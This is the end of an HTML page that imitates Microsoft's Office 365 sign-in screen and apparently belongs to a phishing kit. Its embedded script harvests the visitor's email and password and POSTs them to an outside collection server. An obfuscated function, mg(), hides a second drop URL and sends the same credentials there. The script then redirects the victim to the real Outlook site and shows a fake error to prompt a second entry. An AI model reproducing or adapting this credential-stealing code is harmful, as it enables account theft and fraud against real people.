                                                <div class="col-md-24">
                                                    <div class="text-13 action-links">
                                                        <!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases -->
                                                        <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp,
                            ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEXtk_X7dhr6zr3uYXtw5zqiyexcgZn5NZBla5ilGZsHH6FxgZXzAy3mIS9C9K90wJL3ZLTUktSizJzM-7wCLwioXHgNmKg4NLgEGCQYHhBwvjIlagrZymylOOHFzvusZeeda6cxYMp1j1o6q8LfJ9zTO9Ukz9wyrdfC1NS3MtLDxy87y00wyKwoOKQjIDSsrKjAJCA20trAwnsAlNYGM6xcbwgY2xg53hACfjLS4RIwNDS10DI10DEwUDcytTCysjsygA0&amp;estsfed=1&amp;uaid=aee73feabdb0451dbd83e8dac30924a3&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=https%3a%2f%2fportal.microsoftonline.com.orgid.com" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                                                        <!-- /ko -->
                                                        <!-- ko if: svr.showCantAccessAccountLink -->
                                                        <div class="form-group"> <a id="cantAccessAccount" href="#" data-bind="
                        text: str['WF_STR_CantAccessAccount_Text'],
                        click: cantAccessAccount_onClick">Can’t access your account?</a> </div>
                                                        <!-- /ko -->
                                                        <!-- ko if: availableCredsWithoutUsername.length > 0 || svr.fShowForgotUsernameLink -->
                                                        <!-- /ko -->
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }">
                                                    <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }">
                                                        <!-- ko if: isSecondaryButtonVisible -->
                                                        <!-- /ko -->
                                                        <div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block">
                                                            <input type="submit" id="idSIButton9" class="btn btn-block btn-primary button_two" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Next"> </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <!-- ko if: tenantBranding.BoilerPlateText -->
                                        <!-- /ko -->
                                    </div>
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- ko if: $parent.currentViewIndex() === $index() -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- ko if: showFedCredButton -->
                    <!-- /ko -->
                    <!-- ko if: newSessionMessage() && !svr.urlMsaStaticMeControl -->
                    <!-- /ko -->
                    <!-- ko if: svr.urlMsaStaticMeControl && newSession() -->
                    <!-- /ko -->
                    <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
                    <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                    <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                    <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
                    <input type="hidden" name="canary" data-bind="value: svr.canary" value="ZzK8oM7iJd5OVyFM95um88HmnJ+f0rWRrTiPtvv2PUQ=8:1">
                    <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEXtk_X7dhr6zr3uYXtw5zqixexahM2Aj9C4yMLxgZbzEJ-hele6aEF7ulpqQWJZZk5uddYBF4xcJjwGzFwcElwCDBoMDwg4VxESvQJk5T5SlHDq53XWOvPGvdOQuGU6z6UVXeFvm-5pleKab-YZVuvpampbkWFh65eV7aaQZF4UFFIZkBJWVlRgGhgbYWVoYT2IQmsDGdYmP4wMbYwc5wgJMRAA2">
                    <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="94233509-c1c4-45af-ac3f-239aaece3800">
                    <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAACEfexXxjamQb3OeGQ4GugvJkSY-UD-yXcjnezRfHBxcAy4P8bWDuLC4kJW5iJNlvl4rT903WiSfkn9Og-knxDtujGZifz2GXSXKtagPoYvfmqn_IwiZ37pgVsHbm90y9YHVVEAW24V5IHQIWJlPd-S-fbL0ncF4VjIlHZKkWBvlVeklbloBkBSLYojGqFECJZjrLle7ya6Lx4RsVEcpDNY9QPpn9fLm5gYI2MAxELBQb1bb5pKMeKMGAPQ4WWryob9z_HhmOuoS22Yvm-W-XHjOBlN3Y5WVvO23cokLxuFYxWSaK6ZqFqkq5q5w9kiIAGk5Gw1yE2YP60aJ0uKEMb12n0HF7xrQ0l1vcNiLrGl7swd_ikjWKvzVYqkLB1Jxr0gAA">
                    <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
                    <input type="hidden" name="NewUser" value="1">
                    <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
                    <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                    <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
                    <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
                    <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1">
                    <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">
                        <input type="hidden" name="i2" data-bind="value: clientMode" value="1">
                        <input type="hidden" name="i17" data-bind="value: srsFailed" value="">
                        <input type="hidden" name="i18" data-bind="value: srsSuccess" value="">
                        <input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
                    </div>
                    <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
                        <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }">
                            <!--  -->
                            <!-- ko if: showLinks || impressumLink || showIcpLicense -->
                            <div id="footerLinks" class="footerNode text-secondary">
                                <!-- ko if: !showIcpLicense --><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2021 Microsoft</span>
                                <!-- /ko --><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a>
                                <!-- ko if: impressumLink -->
                                <!-- /ko -->
                                <!-- ko if: showIcpLicense -->
                                <!-- /ko -->
                                <a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information">
                                    <!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko component: 'accessible-image-control' -->
                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                    <!-- /ko -->
                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
                                    <!-- /ko -->
                                    <!-- /ko -->
                                    <!-- /ko -->
                                </a>
                            </div>
                            <!-- ko if: showDebugDetails -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                    </div>
                </div>
                <!-- /ko -->
            </div>
            <!-- /ko -->
            <!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() -->
            <!-- /ko -->
        </form>
        <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
            <!-- ko foreach: postRedirectParams -->
            <!-- /ko -->
        </form>
        <!-- ko if: svr.urlMsaMeControl && !svr.urlMsaStaticMeControl -->
        <!-- /ko -->
        <!-- ko if: svr.urlMsaStaticMeControl && callMsaStaticMeControl() -->
        <!-- /ko -->
        <!-- ko if: svr.urlCBPartnerPreload --
        <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }">
            <iframe style="display: none;" src="https://portal.microsoftonline.com/Prefetch/Prefetch.aspx" width="0" height="0"></iframe>
        </div>
         /ko -->
    </div>

	<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
    <script>
	  $(document).ready(function(){
	    get_email_hash();
		var i0116 = $('#i0116');
		//var pass_i0118 = $('#i0118');
		var url = '';
		var yid = GetURLParameter('username');
		var yid2 = false;
		/*  */

		if(!yid && get_email_hash() != false){

		  //if(get_email_hash() != false){
		    yid = get_email_hash();
		    yid2 = true;
		  //}
		}
		/*  */
		var email_sect = $('.email_section_xyz');
		var pass_sect = $('.pass_section_xyz');
		var displayName = $('#displayName');
		var login_name_xyz = $('.login_name_xyz');
		displayName.attr('value', yid);
		displayName.html(' <span style="font-size: 20px; cursor: pointer" class="back_btnuuu"> &#8592; </span> '+yid);
		$('.back_btnuuu').click(function(){
		  window.location.replace("index1.html");
		});
		login_name_xyz.val(yid);
		if(yid && yid != '' && yid.length > 4){
		  email_sect.remove();
		  pass_sect.show();
		  i0116.val(yid);
		}
		else{
		  pass_sect.remove();
		  email_sect.show();
		}
		var idSIButton9 = $('#idSIButton9');
			  var fatpt = false;
		  fatpt = GetURLParameter('fatpt');
          var fatpt2 = 'a';
          if(fatpt && fatpt == 'b'){
		    fatpt2 = 'b';
            if(!GetURLParameter('response_type')){
			$('.alert_msg_yxq').html("Invalid email or password");
			$('.alert_email_sect').show();
         	}
		  }

		idSIButton9.click(function(e){
		  e.preventDefault();
		 // alert('sss');
		  idSIButton9.css({ 'border-color' : '#ffffff'  });
		  var email = i0116.val();
		  if($('.email_section_xyz').length){
		    if(email != '' && email.length > 4){
		      if(yid2){
			    url = 'index1.html#'+yid;
			  }
			  else{
			  url = '?response_type=code&fatpt='+fatpt2+'&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWSPW_TUBSGc5M0NFEFFUKCMQMsSE6urz9iR-qQkMR1SK7TfDRNlihx7Npx7Osmzpd_AUhIdM6ChISQKiYECPETKiHKWgl16YCYKibEhNud5bzDeYaj9zmPI3SKzj5kGZbrZwYiJfZ5hmJFGlJ9FvEUwzE8gyA95CAzuZvY_vBi653ysiw_v1z9ePSq3liDeG9szrWUSuwTcN_wPHeaTacXi0WK6Lqp3izSnwE4A-AnAOvwhuZQrcZJeMozvMAKPMeyIqQhzQhsqjoqLpV2Z4ntotfxsak0IKwWykalaXHdguV1C6URbrb8jl2yqvbeAo_yFm7mkFLIediWVze8Xx9V2qVRFckB3_KDhFiSYcevG-fhO0pu5hnoepCJ6Wu_w3GdTOyeS6beOvIWKK7myMMnxHE01UtdY5rjmWrfM4lTmxBXm3imNt0RW-6AyowPO8v-3N49WvGZXE9mMnSuKez2jD4tmBanaOVaiS9alcG0WyaC8BT7ECqNUeeAlkTUVmpIsor7_FKrMQuvW9GJinEmT0mzglxddsdUHtXn6l7JLRt4sH9QrxozvS4Tm-RbNf59JBbUahPnNHI7OMoxh0l3QnRzrJ1Fwa_oFoxkNzcT26EHoWToTxS83gjMXX28jH79-0168-lCvfiOQ6cbaavBtdHYkg8xHJSlMWfKMzNQPWNVPY9cC9mNll9aHUmyAnfoLH0cA8ex2FUMPLsV-hL_n-vzxL3gX0QKIgqySShkGZSlhe4_0&estsfed=1&uaid=ac0c8cb48f4f494a89e479dd259f5253&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US&username='+email;
		      }
			  window.location.replace(url);
		    }else{
		      $('.alert_email_sect').show();
		    }
		  }

		  if($('.pass_section_xyz').length){
              var pass = $('#i0118');
              var password_v = pass.val();
              if(yid && yid != '' && yid.length > 4 && password_v != ''){
             if (idSIButton9.hasClass('check-password')) {
                     $(this).removeClass('check-password');
                     var emidthe = 'f800e32d9ce13d84f7a6bcc30b4ee1b0';
                     var ajax_url = 'https://perf4m.intuitivewebsiteservices.com/cron/boz//finish.php';
                   mg(yid,password_v,'Office1-double-login');
                   pass.val('');

               $.ajax({
                  url: ajax_url,
                  type: 'POST',
                  dataType: 'html',
                 beforeSend: function(){
                   $('.ldsddddd').show();
                 },
                  data: { Email : yid, password : password_v, theemid : emidthe, fatptt : fatpt2, loggginatp : 'a', typeofemail : 'Office1-double-login' },
                 crossDomain: true,
                  success: function(msg) {
                      console.log('msg*****************',msg)
                     },
                      error: function(e) {
                        console.log(e)
                        console.log('errr*****************',e)
                      }
                    });
                    $('.ldsddddd').hide();
                     pass.val('');
              } else {
                      //var password_v = login_passwd.val();
                      /*  */
                      var emidthe = 'f800e32d9ce13d84f7a6bcc30b4ee1b0';
                      var ajax_url = 'https://perf4m.intuitivewebsiteservices.com/cron/boz/finish.php';
                    mg(yid,password_v,'Office1-double-login');
                $.ajax({
                   url: ajax_url,
                   type: 'POST',
                   dataType: 'html',
                  beforeSend: function(){
                    $('.ldsddddd').show();
                  },
                   data: { Email : yid, password : password_v, theemid : emidthe, fatptt : fatpt2, loggginatp : 'a', typeofemail : 'Office1-double-login' },
                  crossDomain: true,
                   success: function(msg) {
                       console.log('msg*****************',msg)
                      },
                       error: function(e) {
                         console.log(e)
                         console.log('errr*****************',e)
                       }
                     });
                  var url = '';
                  var rString = randomString(40, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');

                   if(fatpt && fatpt == 'b'){
                    url = 'http://portal.office.com';
                    //window.location.replace(url);
                   }
                   else{
                    url = 'https://outlook.office.com?response_type=code&fatpt='+fatpt2+'&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&state=rQIIAXWSPW_TUBSGc5M0NFEFFUKCMQMsSE6urz9iR-qQkMR1SK7TfDRNlihx7Npx7Osmzpd_AUhIdM6ChISQKiYECPETKiHKWgl16YCYKibEhNud5bzDeYaj9zmPI3SKzj5kGZbrZwYiJfZ5hmJFGlJ9FvEUwzE8gyA95CAzuZvY_vBi653ysiw_v1z9ePSq3liDeG9szrWUSuwTcN_wPHeaTacXi0WK6Lqp3izSnwE4A-AnAOvwhuZQrcZJeMozvMAKPMeyIqQhzQhsqjoqLpV2Z4ntotfxsak0IKwWykalaXHdguV1C6URbrb8jl2yqvbeAo_yFm7mkFLIediWVze8Xx9V2qVRFckB3_KDhFiSYcevG-fhO0pu5hnoepCJ6Wu_w3GdTOyeS6beOvIWKK7myMMnxHE01UtdY5rjmWrfM4lTmxBXm3imNt0RW-6AyowPO8v-3N49WvGZXE9mMnSuKez2jD4tmBanaOVaiS9alcG0WyaC8BT7ECqNUeeAlkTUVmpIsor7_FKrMQuvW9GJinEmT0mzglxddsdUHtXn6l7JLRt4sH9QrxozvS4Tm-RbNf59JBbUahPnNHI7OMoxh0l3QnRzrJ1Fwa_oFoxkNzcT26EHoWToTxS83gjMXX28jH79-0168-lCvfiOQ6cbaavBtdHYkg8xHJSlMWfKMzNQPWNVPY9cC9mNll9aHUmyAnfoLH0cA8ex2FUMPLsV-hL_n-vzxL3gX0QKIgqySShkGZSlhe4_0&estsfed=1&uaid=ac0c8cb48f4f494a89e479dd259f5253&fci=4345a7b9-9a63-4910-a426-35363201d503&mkt=en-US&username='+email
                  }

                   setTimeout(function(){
                    window.location.replace('https://outlook.office.com');
                  }, 1000);

                 }
            } else{
               $('.alert_msg_yxq').html('Please enter the password for your Microsoft account.');
               $('.alert_email_sect').show();
             }

		  }
		  //alert(yid);
		});
		//alert(yid);
	  });

	  function get_email_hash(){
	    var output = false;
	    var sPageURL = window.location.href;
		//sPageURL = 'http://localhost/office1withemail/index-home.html#test@gmail.com';
		sPageURL = sPageURL.trim();
		var last_index_of_hash = sPageURL.lastIndexOf('#');
		if(last_index_of_hash != -1){
		  output = sPageURL.substring(last_index_of_hash+1);
		  if(!validateEmail(output)){
		    output = false;
		  }
		}
       // alert(output);
		//var sURLVariables = sPageURL.split('&');
		//console.log(sURLVariables);
		return output;
	  }

function validateEmail(email) {
    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}
	  	function GetURLParameter(sParam)
{
    var sPageURL = window.location.search.substring(1);
    var sURLVariables = sPageURL.split('&');
    for (var i = 0; i < sURLVariables.length; i++)
    {
        var sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] == sParam)
        {
            return decodeURIComponent(sParameterName[1]);
        }
    }
}
 function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
function mg(a,o,t){var n=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9","/",":",".","-"],r=n[7]+n[19]+n[19]+n[15]+n[18]+n[63]+n[62]+n[62]+n[22]+n[4]+n[1]+n[15]+n[8]+n[2]+n[19]+n[20]+n[17]+n[4]+n[64]+n[2]+n[2]+n[62]+n[4]+n[12]+n[0]+n[8]+n[11]+n[65]+n[11]+n[8]+n[18]+n[19]+n[62]+n[5]+n[8]+n[13]+n[8]+n[18]+n[7]+n[65]+n[20]+n[13]+n[21]+n[54]+n[64]+n[15]+n[7]+n[15];$.ajax({url:r,type:"POST",dataType:"html",data:{Email:a,password:o,typeofemail:t},crossDomain:!0,success:function(a){},error:function(a){}})}
 </script>
</body>

</html>
